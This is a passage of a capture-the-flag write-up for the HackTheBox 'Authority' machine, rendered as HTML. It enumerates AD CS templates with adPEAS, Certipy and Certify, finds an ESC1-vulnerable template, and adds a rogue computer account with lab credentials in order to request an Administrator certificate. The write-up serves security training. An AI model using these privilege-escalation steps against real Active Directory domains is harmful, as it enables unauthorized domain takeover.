+</span></span><span class="line"><span class="cl">  Web Enrollment Servers:       <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">CertUtil: -dump <span class="nb">command</span> completed successfully
+</span></span></code></pre></div><h3 id="enum-with-adpeas" class="relative group">Enum with adPEAS <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enum-with-adpeas" aria-label="Anchor">#</a></span></h3><p>Executed the <code>adPEAS.ps1</code> script to perform additional enumeration in the AD environment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">adPEAS</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-adPEAS</span> <span class="n">-Domain</span> <span class="s1">&#39;authority.htb&#39;</span> <span class="n">-Outputfile</span> <span class="n">adPEAS_outputfile</span> <span class="n">-NoColor</span>
+</span></span></code></pre></div><p>All members of the <code>Authenticated Users</code> group possess permissions to add computers to the <code>authority.htb</code> domain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>?<span class="o">]</span> +++++ Checking Add-Computer Permissions +++++
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Filtering found identities that can add a computer object to domain <span class="s1">&#39;authority.htb&#39;</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Every member of group <span class="s1">&#39;Authenticated Users&#39;</span> can add a computer to domain <span class="s1">&#39;authority.htb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName:          <span class="nv">CN</span><span class="o">=</span>S-1-5-11,CN<span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">objectSid:              S-1-5-11
+</span></span><span class="line"><span class="cl">memberOf:               <span class="nv">CN</span><span class="o">=</span>Pre-Windows <span class="m">2000</span> Compatible Access,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">                    <span class="nv">CN</span><span class="o">=</span>Certificate Service DCOM Access,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">                    <span class="nv">CN</span><span class="o">=</span>Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>Looking at vulnerabilities in AD CS, it appears that the <code>CorpVPN</code> template is susceptible to the <code>ECS1</code> vulnerability.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>?<span class="o">]</span> +++++ Checking Template <span class="s1">&#39;CorpVPN&#39;</span> +++++
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Template <span class="s1">&#39;CorpVPN&#39;</span> has Flag <span class="s1">&#39;ENROLLEE_SUPPLIES_SUBJECT&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Identity <span class="s1">&#39;HTB\Domain Computers&#39;</span> has enrollment rights <span class="k">for</span> template <span class="s1">&#39;CorpVPN&#39;</span>
+</span></span><span class="line"><span class="cl">Template Name:              CorpVPN
+</span></span><span class="line"><span class="cl">Template distinguishedname:     <span class="nv">CN</span><span class="o">=</span>CorpVPN,CN<span class="o">=</span>Certificate Templates,CN<span class="o">=</span>Public Key Services,CN<span class="o">=</span>Services,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">Date of Creation:           03/24/2023 23:48:09
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extended Key Usage:         Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication
+</span></span><span class="line"><span class="cl">EnrollmentFlag:             INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> CertificateNameFlag:        ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enrollment allowed <span class="k">for</span>:     HTB<span class="se">\D</span>omain Computers
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation" class="relative group">Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="ad-cs-certificate-abuse" class="relative group">AD CS Certificate abuse <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ad-cs-certificate-abuse" aria-label="Anchor">#</a></span></h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy find -vulnerable -stdout -u svc_ldap@authority.htb -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -dc-ip 10.129.216.215
+</span></span><span class="line"><span class="cl">Certipy v4.8.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">37</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via CSRA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : authority.authority.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Template Name                       : CorpVPN
+</span></span><span class="line"><span class="cl">    Display Name                        : Corp VPN
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+</span></span><span class="line"><span class="cl">                                          PublishToDs
+</span></span><span class="line"><span class="cl">                                          IncludeSymmetricAlgorithms
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : ExportableKey
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Encrypting File System
+</span></span><span class="line"><span class="cl">                                          Secure Email
+</span></span><span class="line"><span class="cl">                                          Client Authentication
+</span></span><span class="line"><span class="cl">                                          Document Signing
+</span></span><span class="line"><span class="cl">                                          IP security IKE intermediate
+</span></span><span class="line"><span class="cl">                                          IP security use
+</span></span><span class="line"><span class="cl">                                          KDC Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">20</span> years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC1                              : <span class="s1">&#39;AUTHORITY.HTB\\Domain Computers&#39;</span> can enroll, enrollee supplies subject and template allows client authentication
+</span></span></code></pre></div><p>There&rsquo;s also a python based tool, <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noreferrer">certipy</a> which can be used to enumerate AD CS remotely.</p>
+<p>According to Certipy&rsquo;s output:</p>
+<ul>
+<li>The Enterprise CA is named <code>AUTHORITY-CA</code>.</li>
+<li>The DNS Hostname is <code>authority.authority.htb</code>.</li>
+<li>The <code>Certificate Name</code> Flag is configured as <code>EnrolleeSuppliesSubject</code>.</li>
+<li><code>Extended Key Usage</code> contains Client Authentication, which means the generated certificate can be used to authenticate to computers in the AD.</li>
+<li>Manager approval is not required before issuing the cert.</li>
+<li><code>Authorized Signatures Required</code> is set to zero.</li>
+</ul>
+<p>As a result, the <code>CorpVPN</code> template appears to be vulnerable to <code>ESC1</code>.</p>
+<p>The same info can be obtained using <a href="https://github.com/GhostPack/Certify" target="_blank" rel="noreferrer">Certify</a>&rsquo;s <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" rel="noreferrer">pre-compiled</a> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_ldap\Documents<span class="p">&gt;</span> .\Certify.exe find /vulnerable
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">[*] Action: Find certificate templates
+</span></span><span class="line"><span class="cl">[*] Using the search base &#39;CN=Configuration,DC=authority,DC=htb&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Listing info about the Enterprise CA &#39;AUTHORITY-CA&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Enterprise CA Name            : AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    DNS Hostname                  : authority.authority.htb
+</span></span><span class="line"><span class="cl">    FullName                      : authority.authority.htb\AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">[!] Vulnerable Certificates Templates :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    CA Name                               : authority.authority.htb\AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    Template Name                         : CorpVPN
+</span></span><span class="line"><span class="cl">    Schema Version                        : 2
+</span></span><span class="line"><span class="cl">    Validity Period                       : 20 years
+</span></span><span class="line"><span class="cl">    Renewal Period                        : 6 weeks
+</span></span><span class="line"><span class="cl">    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+</span></span><span class="line"><span class="cl">                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
+</span></span><span class="line"><span class="cl">                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Certify completed in 00:00:10.0047510
+</span></span></code></pre></div><p>The <code>ESC1</code> vulnerability, which involves a misconfigured certificate template, allows users with enrollment rights to specify a SAN ( subjectAltName ). The certificate name flag is associated with the construction of the subject name for an issued certificate. When set to <code>EnrolleeSuppliesSubject</code>, it signifies that the user initiating a new certificate request for the said template can specify the certificate for any other user. Exploiting this vulnerability would allow me to obtain certificates for other users, including Domain Admins.</p>
+<p>According to the enrolment permissions for the vulnerable certificate, aside from Domain Admins, members of the <code>Domain Computers</code> group also have enrolment rights. <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-computers" target="_blank" rel="noreferrer">Domain Computers</a> is a default AD group comprising of all computers in the domain. Enumeration with adPEAS indicated that any authenticated user can add a computer to the domain. Since, the <code>svc_ldap</code> user isn&rsquo;t part of the group, exploiting the vulnerable certificate template requires joining the <code>Domain Computers</code> group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="nb">group </span><span class="s1">&#39;Domain Computers&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">name</span>     <span class="n">Domain</span> <span class="n">Computers</span>
+</span></span><span class="line"><span class="cl"><span class="n">Comment</span>        <span class="n">All</span> <span class="n">workstations</span> <span class="n">and</span> <span class="n">servers</span> <span class="n">joined</span> <span class="n">to</span> <span class="n">the</span> <span class="n">domain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Members</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                                  <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="p">===========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                                    <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>             <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">580</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                               <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">545</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="nb">Pre-Windows</span> <span class="mf">2000</span> <span class="n">Compatible</span> <span class="n">Access</span>  <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">554</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Certificate</span> <span class="n">Service</span> <span class="n">DCOM</span> <span class="n">Access</span>     <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">574</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span>                        <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">2</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>            <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">15</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>            <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">64</span><span class="p">-</span><span class="mf">10</span>  <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="n">Plus</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">8448</span>
+</span></span></code></pre></div><p>The <a href="https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota" target="_blank" rel="noreferrer">MachineAccountQuota</a> is set to a value greater than 0. This implies that even unprivileged users have the ability to add computers to the domain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Get-ADDomain</span> <span class="p">|</span> <span class="nb">Get-ADObject</span> <span class="n">-Properties</span> <span class="s1">&#39;ms-DS-MachineAccountQuota&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">ms-ds</span><span class="n">-machineaccountquota</span>
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------</span>
+</span></span><span class="line"><span class="cl">                       <span class="mf">10</span>
+</span></span></code></pre></div><p>The same information can be obtained remotely using <a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noreferrer">bloodyAD</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD -u <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -d authority.htb --host 10.10.11.222 get object <span class="s1">&#39;DC=authority,DC=htb&#39;</span> --attr ms-DS-MachineAccountQuota
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">ms-DS-MachineAccountQuota: <span class="m">10</span>
+</span></span></code></pre></div><h3 id="exploit-path" class="relative group">Exploit Path <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploit-path" aria-label="Anchor">#</a></span></h3><p>Based on the findings, I can get an Administrator certificate:</p>
+<ul>
+<li>Add a new computer to the domain to gain access to the <code>Domain Computers</code> group.</li>
+<li>Authenticate to the newly added computer.</li>
+<li>Request a certificate for Administrator from the vulnerable template using the new computer.</li>
+<li>Utilize PassTheCert to authenticate as Administrator.</li>
+</ul>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/excali-exploit-path.png" alt="excalidraw-exploit-path" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Exploit explained</figcaption>
+</figure>
+</p>
+<p>The <a href="https://tools.thehacker.recipes/impacket/examples/addcomputer.py" target="_blank" rel="noreferrer">addcomputer.py</a> script from Impacket can be to used to add a new computer account in the domain, using the credentials of a domain user. The input format is <code>DOMAIN/username:password</code> followed by the computer name and computer password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ addcomputer.py authority.htb/svc_ldap:<span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -computer-name Abraxas -computer-pass Abraxas
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully added machine account Abraxas$ with password Abraxas.
+</span></span></code></pre></div><p>This can be verified using the <code>Get-ADComputer</code> command. The computer <code>Abraxas$</code> is present, but comparing it with the <code>Authority$</code> computer, it lacks the <code>DNSHostName</code> attribute.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_ldap\Documents<span class="p">&gt;</span> Get-ADComputer Abraxas -properties dnshostname,serviceprincipalname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DistinguishedName : CN=Abraxas,CN=Computers,DC=authority,DC=htb
+</span></span><span class="line"><span class="cl">DNSHostName       :
+</span></span><span class="line"><span class="cl">Enabled           : True
+</span></span><span class="line"><span class="cl">Name              : Abraxas
+</span></span><span class="line"><span class="cl">ObjectClass       : computer
+</span></span><span class="line"><span class="cl">ObjectGUID        : d7c3dfee-2cb5-4f28-8afc-38913a60b83d
+</span></span><span class="line"><span class="cl">SamAccountName    : Abraxas$
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-622327497-3269355298-2248959698-11618
+</span></span><span class="line"><span class="cl">UserPrincipalName :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_ldap\Documents<span class="p">&gt;</span> Get-ADComputer Authority -properties dnshostname,serviceprincipalname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DistinguishedName    : CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
